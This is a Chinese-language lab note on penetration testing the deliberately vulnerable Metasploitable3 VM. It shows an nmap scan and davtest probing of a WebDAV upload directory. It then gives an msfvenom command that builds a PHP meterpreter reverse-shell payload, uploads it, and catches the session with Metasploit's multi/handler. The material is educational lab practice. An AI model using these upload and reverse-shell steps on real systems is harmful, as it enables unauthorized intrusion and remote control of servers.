---
title: 【資訊安全】Metasploitable3 滲透測試實作（筆記）
date: 2024-04-20
tags:
  - security
---

## 先備知識

- 知道如何使用 VMware 或 VirtualBox
- Kali Linux 基本操作
- 能夠讓 Kali 連線至 Metasploitable3
- 良好的網路環境

## 確認 IP

Win2k8:

```bash
ipconfig
```

ub1404:

```bash
ifconfig
```

## 弱點掃描

使用 Nmap 將所有 port 掃描一遍，查看主機上開啟的 Service

```bash
sudo nmap -sV -sS -n -v --reason --open -p- <Metasploitable3 IP>
```

\<Metasploitable3 IP\> 請替換成靶機 IP

![nmap1](/images/metasploitable3/nmap_1.png)

![nmap2](/images/metasploitable3/nmap_2.png)

## 文件上傳漏洞

![upload](/images/metasploitable3/file_upload/uploads.png)

掃描 8585 port 是否存在文件上傳漏洞

```bash
davtest -url http://<Metasploitable3 IP>:8585/uploads/
```

![davtest](/images/metasploitable3/file_upload/davtest.png)

### 利用 msfvenom 生成 reverse shell payload

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Kali IP> LPORT=4444 -f raw > payload.php
```

\<Kali IP\> 請替換成 Kali Linux 的 IP

![msfvenom](/images/metasploitable3/file_upload/msfvenom.png)

```
註：Reverse Shell 與 Bind Shell
    * Reverse Shell: 讓受害者主動開 shell 給攻擊者，攻擊者要開 listener，並等受害者連線，因此需設定 LHOST/PORT 讓受害者連線
    * Bind Shell: 在受害者開一個後門，接著攻擊者主動連線到受害者，因此需設定 RHOST/PORT 讓攻擊者連線
```

### 上傳 payload

```bash
davtest -url http://<Metasploitable3 IP>:8585/uploads/ -upload payload.php -uploadloc DavTestDir_xxxxx/payload.php
```

![upload_payload](/images/metasploitable3/file_upload/upload_payload.png)

![upload_payload2](/images/metasploitable3/file_upload/upload_payload2.png)

### 啟動 metasploit

```bash
msfconsole
```

### 使用 exploit/multi/handler 模組

```bash
use exploit/multi/handler
```

### 設定 payload

```bash
set payload php/meterpreter/reverse_tcp
```

![msfconsole](/images/metasploitable3/file_upload/msfconsole.png)

### 設定參數

```bash
set LHOST <Kali IP>
set LPORT 4444
```

![msfconsole2](/images/metasploitable3/file_upload/msfconsole2.png)

### 執行

```bash
run
```

![run](/images/metasploitable3/file_upload/run.png)

### 等待受害者點擊 payload.php

![run2](/images/metasploitable3/file_upload/run2.png)

![meterpreter](/images/metasploitable3/file_upload/meterpreter.png)
